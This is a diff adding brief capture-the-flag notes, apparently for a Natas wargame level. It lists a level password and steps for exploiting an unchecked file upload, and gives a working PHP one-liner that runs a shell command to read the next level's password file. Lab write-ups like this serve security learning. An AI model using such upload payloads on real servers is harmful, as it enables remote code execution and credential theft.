@@ -1,0 +1,6 @@
+EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+[check source code]
+[see that uploaded file is not checked for type]
+[upload short php file via POST, making sure that the file type is set as .php]
+<?php echo exec("cat /etc/natas_webpass/natas13"); ?>
+[open linked file]
